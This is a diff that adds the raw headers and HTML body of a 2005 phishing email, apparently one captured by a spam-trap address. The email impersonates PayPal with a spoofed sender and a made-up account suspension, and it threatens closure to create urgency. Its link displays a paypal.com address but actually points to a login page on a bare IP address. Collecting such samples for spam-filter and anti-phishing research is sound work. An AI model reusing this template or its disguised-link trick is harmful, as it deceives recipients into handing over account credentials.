@@ -1,0 +1,94 @@
+Received: from msgmmp-2.gci.net (209.165.130.12)
+  by projecthoneypotmailserver with SMTP; 25 Jun 2005 13:46:40 -0000
+Received: from petersburg.pcsd.schoolaccess.net ([65.74.21.120])
+ by msgmmp-2.gci.net (Sun Java System Messaging Server 6.2 (built Dec  2 2004))
+ with ESMTP id <0IIN00G7B7LLQGD0@msgmmp-2.gci.net> for
+ projecthoneypot@projecthoneypot.org; Sat, 25 Jun 2005 05:46:33 -0800 (AKDT)
+Received: (from httpd@localhost)	by petersburg.pcsd.schoolaccess.net
+ (8.10.2/8.10.2) id j5PDkWX13850; Sat, 25 Jun 2005 05:46:32 -0800
+Date: Sat, 25 Jun 2005 05:46:32 -0800
+From: Customer Support <support@paypal.com>
+Subject: PayPal Notification ( Your account is suspended )
+To: projecthoneypot@projecthoneypot.org
+Reply-to: support@paypal.com
+Message-id: <200506251346.j5PDkWX13850@petersburg.pcsd.schoolaccess.net>
+MIME-version: 1.0
+X-Mailer: PHP/4.0.6
+Content-type: text/html; charset=iso-8859-1
+Content-transfer-encoding: 7BIT
+
+<A
+href="http://www.paypal.com/cgi-bin/webscr?cmd=_home"><IMG
+
+
+src="https://www.paypal.com/en_US/i/logo/paypal_logo.gif"
+
+border=0></A>&nbsp; 
+<TABLE cellSpacing=0 cellPadding=0 width=600
+align=center border=0>
+<body><p><font style="font-family: courier
+new,verdana,arial; font-size: 12px;"><br>
+Dear PayPal Member,<br><br>
+
+PayPal is committed to maintaining a safe environment
+for its community of<br>
+buyers and sellers. To protect the security of your
+account, PayPal employs<br>
+some of the most advanced security systems in the
+world and our anti-fraud<br>
+teams regularly screen the PayPal system for unusual
+activity.<br><br>
+
+Recently, our Account Review Team identified some
+unusual activity in your<br>
+account. In accordance with PayPal's User Agreement
+and to ensure that your<br>
+account has not been compromised, access to it was
+flagged.You<br>
+will remain flagged until this issue has been
+resolved. <br>
+This is a fraud prevention measure meant to ensure
+that your account is not<br>
+compromised.<br><br>
+
+ In order to secure your account and quickly restore
+full access, we may<br>
+require some specific information from you for the
+following reason: <br><br>
+
+Our system requires further account verification.
+<br><br>
+ 
+Case ID Number: PP-056-245-481<br>
+We encourage you to log in and restore full access as
+soon as possible.<br>
+Should your account remain flagged for an extended
+period of time, <br>
+it may result in further limitations on the use of
+your account or<br>
+may result in eventual account closure.<br><br>
+-----------------------------------------------------------------------<br>
+Please click on the link below  to log in <br>and
+restore full access to your account.
+<br>
+<a
+href="http://81.215.214.168/paypal/login.htm">
+https://www.paypal.com/cgi-bin/webscr?cmd=_login-run</a>
+<br>
+
+
+
+----------------------------------------------------------------------<br><br>
+
+Thank you for your prompt attention to this matter.
+Please understand that<br>
+this is a security measure meant to help protect you
+and your account. We<br>
+apologize for any inconvenience.<br><br><br>
+
+Sincerely,<br>
+PayPal Account Review Department<br><br>
+
+PayPal Email ID PP562
+
+</font>
